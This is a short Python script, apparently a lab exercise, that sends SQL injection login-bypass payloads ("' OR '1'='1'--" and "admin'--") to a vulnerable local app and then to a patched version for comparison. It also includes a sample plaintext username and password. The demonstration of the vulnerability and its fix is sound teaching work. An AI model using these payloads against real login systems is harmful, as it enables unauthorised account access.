import requests

BASE = "http://localhost:5000"

print("=== ATAQUE 1: Login bypass ===")
payload = {"login": "' OR '1'='1'--", "senha": "qualquer"}
r = requests.post(f"{BASE}/login", json=payload)
print(f"Payload: {payload}")
print(f"Resposta: {r.status_code} {r.json()}")

print("\n=== ATAQUE 2: Login como usuario especifico ===")
payload2 = {"login": "admin'--", "senha": "qualquer"}
r2 = requests.post(f"{BASE}/login", json=payload2)
print(f"Payload: {payload2}")
print(f"Resposta: {r2.status_code} {r2.json()}")

print("\n=== VERIFICANDO APP SEGURO (porta 5001) ===")

SBASE = "http://localhost:5001"

r4 = requests.post(
    f"{SBASE}/login", json={"login": "' OR '1'='1'--", "senha": "qualquer"})
print(f"Ataque 1 (bypass) → {r4.status_code} {r4.json()}")

r5 = requests.post(
    f"{SBASE}/login", json={"login": "admin'--", "senha": "qualquer"})
print(f"Ataque 2 (usuario especifico) → {r5.status_code} {r5.json()}")

r6 = requests.post(
    f"{SBASE}/login", json={"login": "ricardo.lima", "senha": "senha123"})
print(f"Login normal → {r6.status_code} {r6.json()}")
